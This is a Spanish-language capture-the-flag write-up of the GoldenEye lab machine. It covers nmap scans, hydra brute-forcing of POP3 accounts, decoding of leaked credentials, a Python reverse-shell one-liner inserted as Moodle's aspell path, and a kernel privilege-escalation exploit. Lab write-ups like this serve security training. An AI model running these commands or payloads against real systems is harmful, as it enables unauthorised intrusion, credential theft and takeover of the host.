
---

- Maquina *Linux*

- Escaneo de todos los puertos

```java
PORT      STATE SERVICE REASON
25/tcp    open  smtp    syn-ack ttl 61
80/tcp    open  http    syn-ack ttl 61
55006/tcp open  unknown syn-ack ttl 61
55007/tcp open  unknown syn-ack ttl 61
```

- Escaneo de scripts de reconocimiento y versiones 

```java

PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA SASL(PLAIN) UIDL TOP USER STLS RESP-CODES AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
```

- Escaneo de vulnerabilidades con nmap 

```java
PORT      STATE SERVICE
25/tcp    open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|       https://weakdh.org
|       https://www.securityfocus.com/bid/74733
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
80/tcp    open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
55006/tcp open  unknown
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
55007/tcp open  unknown
```

---

#### Explotación

- Viendo los el código fuente de la pagina web podemos evidenciar usuarios y contraseñas claras en la ruta en la que se designa *view-source:http://10.201.71.25/terminal.js* 

Usuarios y Contraseñas Posibles

Usuario: *Boris*
Contraseña: &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

Usuario: *Natalya*



- Usamos la pagina de cypher identifier para ver en que lenguaje esta codificada la contraseña y encontramos que esta en *Html Escape*, la deciframos y podemos ver que las credenciales del usuario son

*Boris* : InvincibleHack3r


- Probamos entrando al protocolo smtp de la siguiente manera:

```bash
telnet 10.201.71.25 25   # Conexion al protocolo smtp eligiendo el puerto 25
nc 10.201.71.25 25       # Alternativa de Conexion al protocolo smtp eligiendo el puerto 25
```

- Probamos conectándonos a pop3 por el puerto *55007* 

```bash
telnet 10.201.71.25 55007  # Conexion a pop3 
nc 10.201.71.25 55007       # Alternativa de Conexion a pop3
```

- Algunos comandos basicos de pop3 son los siguientes:

```bash
USER usuario              # Enviar tu nombre de usuario
PASS contraseña           # Enviar tu contraseña
STAT                      # Ver cantidad y tamaño total de mensajes
LIST                      # Listar mensajes con número y tamaño
RETR 1                    # Descargar el mensaje número 1
DELE 1                    # Eliminar el mensaje número 1
NOOP                      # No hace nada (mantiene conexión)
RSET                      # Cancela eliminaciones marcadas
QUIT                      # Cierra sesión y aplica cambios

```


- Al ver que entrando con el usuario *boris* no nos permite usar la contraseña que teniamos entonces usamos fuerza bruta para encontrar una nueva contraseña

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.201.71.25 -t 16 -s 55007   # Comando para hacer fuerza bruta con el usuario boris por el servicio de pop3
```

- Creds:
*boris* : secret1!


```bash
nc <Ip> 55007  # Nos conectamos al servicio
USER boris     # Usuario
PASS secret1!  # Contraseña
LIST           # Listamos los mensajes que ha recivido
RETR 1         # Descargamos el mensaje 1 
RETR 2         # Descargamos el mensaje 2 
RETR 3         # Descargamos el mensaje 3
```



![[Pasted image 20251030191040.png]]

![[Pasted image 20251030191118.png]]

![[Pasted image 20251030191141.png]]


- Descargados los mensajes podemos enumerar nuevos usuarios quedando que 

*boris* : secret1!
*natalya* :
*alec*: alec@janus.boss : 
*xenia*: 


- Atacamos con fuerza bruta a los otros usuarios hasta conseguir credenciales:

```bash
hydra -l alec -P /usr/share/wordlists/fasttrack.txt pop3://10.201.71.25 -t 16 -s 55007
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://10.201.71.25 -t 16 -s 55007
hydra -l xenia -P /usr/share/wordlists/fasttrack.txt pop3://10.201.71.25 -t 16 -s 55007
```


Encontramos las  credenciales de: 

*natalya* : bird

- Hallamos los mensajes de:

![[Pasted image 20251030192842.png]]

![[Pasted image 20251030192906.png]]

- Nueva Informacion 

*xenia* : RCP90rulez!

Domain: severnaya-station.com/gnocertdir

- Agregamos el dominio encontrado al etc/hosts : *severnaya-station.com*

-  Entrando en el panel de xenia vemos que en mensajes hay una conversacion con el usuario *doak* por lo que usamos fuerza bruta para saber su contraseña

```bash
hydra -l doak -P /usr/share/wordlists/rockyou.txt pop3://10.201.71.25 -t 16 -s 55007
```

*doak* : goat

- Entramos nuevamente al servicio pop3 y vemos las siguientes credenciales

![[Pasted image 20251030195109.png]]

username: dr_doak
password: 4England!

- Entramos al usuario y vemos que en los documentos privados tiene la siguiente informacion:

![[Pasted image 20251030195633.png]]


- La información nos lleva a una ruta la cual es http://severnaya-station.com//dir007key/for-007.jpg en la cual se ve una imagen asi que la descargamos y le ex traemos los metadatos

```bash
wget http://severnaya-station.com//dir007key/for-007.jpg
steghide --extract -sf for-007.jpg      # No funciona 
strings for-007.jpg         # Encontramos la informacion oculta en un hash "eFdpbnRlcjE5OTV4IQ=="

```

![[Pasted image 20251030201456.png]]

- Desencriptamos con base64 y nos da una contraseña : *xWinter1995x!* del usuario *admin*


Con el usuario admin buscamos la ruta del binario aspell que es un plugin de correcion ortografica y cambiamos la ruta a una reverse shell con python:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.23.197.56",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

y cambiamos el SpellEngine a PsSpellShell, vamos creamos un blog y le damos el boton de correcion ortografica el cual nos deveria enviar una reverse shell a nuestra consola en escucha 


```bash
uname -r   # Vemos la version del kernel
https://www.exploit-db.com/exploits/37292  # Descargamos el exploit de escalada de privilegios desde la pagina y pegamos el codigo en una archivo.c

nano exploit.c
sed -i "s/gcc/cc/g" exploit.c   # Hacemos unas sustituciones y copmpartimos el codigo con la maquina victima 

cc exploit.c -o exploited    # Ejecutamos el codigo para que nos de un ejecutable exploited
./exploited   # Ejecutamos el codigo y tenemos root 

```

